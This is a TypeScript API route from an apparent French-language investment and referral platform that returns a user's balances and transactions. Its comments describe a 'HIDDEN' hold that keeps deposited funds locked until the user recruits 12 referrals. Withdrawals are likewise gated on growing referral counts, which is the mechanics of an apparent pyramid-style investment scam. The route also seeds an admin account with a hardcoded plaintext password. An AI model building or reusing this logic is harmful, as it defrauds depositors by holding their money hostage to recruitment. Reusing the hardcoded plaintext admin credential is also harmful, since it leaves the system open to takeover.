import { db } from '@/lib/db';
import { ensureSiteConfig } from '@/lib/site-config';
import { getRequiredReferrals, needsMoreReferrals, tryClaimReferralReward } from '@/lib/referral';
import { getAuthToken } from '@/lib/auth';
import { notifyUser } from '@/lib/notify';
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';

let initialized = false;
async function ensureInitialized() {
  if (initialized) return;
  const adminExists = await db.user.findUnique({ where: { email: 'silomano228@gmail.com' } });
  if (!adminExists) {
    await db.user.create({
      data: { email: 'silomano228@gmail.com', name: 'Admin', password: 'Admin@2024', role: 'admin', referralCode: 'BR-ADMIN', emailVerified: true },
    });
  }
  await ensureSiteConfig();
  initialized = true;
}

export async function GET(request: Request) {
  try {
    // One-time initialization: seed admin & site config
    await ensureInitialized();

    // Anti-fraud (hidden): resolve the user via the sessionToken cookie
    // (with backward-compat for legacy user.id cookies). If the sessionToken
    // was rotated by a newer login elsewhere, this returns null and the
    // frontend will show the login screen.
    const user = await getAuthToken(request);

    if (!user) {
      return NextResponse.json({ success: false });
    }

    // Feature 3 (HIDDEN level-2 hold): passive release of held investment
    // funds. If the user has funds in heldInvestBalance AND the 10-day wait
    // has elapsed AND they have reached 12 referrals, credit the held amount
    // to the principal balance and notify them. This runs on every session
    // load (login/refresh) so the user simply needs to refresh to trigger the
    // release once conditions are met.
    const releaseNow = new Date();
    if (
      user.heldInvestBalance > 0 &&
      user.heldReleaseAt &&
      releaseNow >= user.heldReleaseAt &&
      user.referralCount >= 12
    ) {
      const heldAmount = user.heldInvestBalance;
      await db.$transaction([
        db.user.update({
          where: { id: user.id },
          data: {
            balance: { increment: heldAmount },
            heldInvestBalance: 0,
            heldReleaseAt: null,
          },
        }),
        db.transaction.create({
          data: {
            type: 'transfer_release',
            amount: heldAmount,
            detail: `Fonds débloqués — disponibles sur le compte principal (transfert investissement → principal)`,
            userId: user.id,
          },
        }),
      ]);
      // Reload user so the response reflects the new balance.
      const refreshedUser = await db.user.findUnique({ where: { id: user.id } });
      if (refreshedUser) {
        Object.assign(user, refreshedUser);
      }
      // Notify the user — non-blocking.
      void notifyUser({
        userId: user.id,
        type: 'funds_released',
        title: 'Fonds disponibles !',
        message: 'Vos fonds sont maintenant disponibles sur votre compte principal. Actualisez votre page pour voir votre nouveau solde.',
        link: 'wallet',
      });
    }

    // Parallelize all independent DB queries
    const [transactions, investments, activeTradesCount, activeEnterprisesCount, completedWithdrawals] = await Promise.all([
      db.transaction.findMany({ where: { userId: user.id }, orderBy: { createdAt: 'desc' } }),
      db.investment.findMany({ where: { userId: user.id }, orderBy: { createdAt: 'desc' } }),
      db.trade.count({ where: { userId: user.id, resolved: false } }),
      db.enterprise.count({ where: { userId: user.id, status: 'active' } }),
      db.withdrawal.count({ where: { userId: user.id, status: 'approved' } }),
    ]);

    // Check if already claimed today for investments
    const now = new Date();
    const activeInvestments = investments.filter((i) => i.status === 'active');
    const claimableInvestments = activeInvestments.filter(
      (i) => i.nextClaimAt && now >= i.nextClaimAt
    );

    // Check 48h withdrawal eligibility
    const firstDepositDate = user.firstDepositAt;
    const canWithdraw = firstDepositDate
      ? (now.getTime() - new Date(firstDepositDate).getTime()) >= 48 * 60 * 60 * 1000
      : false;

    const hoursUntilWithdrawal = firstDepositDate && !canWithdraw
      ? Math.ceil(48 - (now.getTime() - new Date(firstDepositDate).getTime()) / (60 * 60 * 1000))
      : 0;

    // Calculate referral requirement for next withdrawal (1 filleul par tranche de 4 retraits)
    const requiredReferrals = getRequiredReferrals(completedWithdrawals);
    const needsReferral = needsMoreReferrals(completedWithdrawals, user.referralCount);

    // Safety-net: if the user has reached 12 active referrals but the $5 gift
    // was never claimed (e.g. register-time credit failed, or referrals were
    // counted manually by an admin), claim it now. Idempotent — no-op if
    // already claimed. The user just receives the surprise notification.
    await tryClaimReferralReward(user);
    // If the reward was just credited, re-read the user so the response
    // reflects the new balance.
    if (user.referralCount >= 12 && !user.referralRewardClaimed) {
      const refreshed = await db.user.findUnique({ where: { id: user.id } });
      if (refreshed) Object.assign(user, refreshed);
    }

    // Rebuild safeUser here so the response reflects any balance changes
    // from the referral reward or held-funds release above. Exclude the
    // sessionToken (anti-fraud internal) alongside the password.
    const { password: _safePwd, sessionToken: _safeTok, ...safeUser } = user;

    return NextResponse.json({
      success: true,
      user: {
        ...safeUser,
        investBalance: user.investBalance,
        tradeBalance: user.tradeBalance,
        projectBalance: user.projectBalance,
        totalProfit: user.totalProfit,
        totalLoss: user.totalLoss,
        transactions,
        investments,
        activeTradesCount,
        activeEnterprisesCount,
        claimableInvestments: claimableInvestments.length,
        canWithdraw,
        hoursUntilWithdrawal,
        completedWithdrawals,
        requiredReferrals,
        needsReferral,
        unlockedLevel: user.unlockedLevel,
      },
    });
  } catch {
    return NextResponse.json({ success: false });
  }
}
